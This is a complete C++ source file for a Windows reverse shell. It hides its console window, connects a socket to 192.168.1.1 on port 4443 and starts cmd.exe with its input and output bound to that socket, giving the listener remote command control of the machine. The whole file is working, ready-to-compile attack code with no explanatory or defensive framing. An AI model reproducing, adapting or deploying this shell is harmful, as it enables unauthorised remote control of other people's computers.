#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#pragma warning(disable:4996)
using namespace std;

int main() {
	FreeConsole();
	string remote_host = "192.168.1.1";
	int remote_port = 4443;

	WSADATA wsaData;

	// Call WSAStartup()
	int WSAStartup_Result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (WSAStartup_Result != 0) {
		printf("[-] WSAStartup failed.");
		return 1;
	}

	// Call WSASocket()
	SOCKET mySocket = WSASocket(2, 1, 6, NULL, 0, NULL);

	// Create sockaddr_in struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(remote_host.c_str());
	addr.sin_port = htons(remote_port);

	// Call connect()
	int connect_Result = WSAConnect(mySocket, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
	if (connect_Result != 0) {
		printf("[-] Connection failed.");
		return 1;
	}

	// Call CreateProcessA()
	STARTUPINFO sinfo;
	TCHAR Process[] = TEXT("cmd.exe");
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
	CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
}